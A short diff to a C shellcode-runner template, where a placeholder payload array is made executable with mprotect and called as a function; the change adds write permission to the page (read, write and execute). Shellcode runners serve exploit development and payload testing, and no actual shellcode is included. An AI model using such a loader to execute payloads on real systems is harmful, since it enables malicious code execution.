@@ -22,7 +22,7 @@ unsigned char PAYLOAD[SCSSIZE] = __SHELLCODE__
 
 int main(int argc, char *argv[]) {
 	// create executable memory
-  mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC);  
+  mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC|PROT_WRITE);  
   int (*exeshell)() = (int (*)()) PAYLOAD;  
   (int)(*exeshell)(); // execute shellcode	
 	return 0;
